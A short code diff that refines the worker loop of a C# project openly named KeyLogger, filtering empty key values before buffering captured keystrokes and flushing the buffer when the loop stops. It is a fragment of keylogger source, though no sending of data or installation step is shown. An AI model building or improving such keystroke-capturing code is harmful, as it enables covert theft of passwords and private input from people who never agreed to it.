@@ -16,12 +16,19 @@ namespace KeyLogger.Library.Worker
         // This method will be called when the thread is started. 
         public void DoWork(object appender)
         {
+            var outputAppender = (IOutputAppender)appender;
+
             while (!_shouldStop)
             {
                 char key = KeyBoardHelper.GetKeyPressed();
-                ((IOutputAppender)appender).SaveToBuffer(key);
+
+                if (!key.Equals(char.MinValue))
+                    outputAppender.SaveToBuffer(key);
+
                 Thread.Sleep(SLEEP_TIME);
             }
+
+            outputAppender.FinalPush();
         }
 
         public void RequestStop()
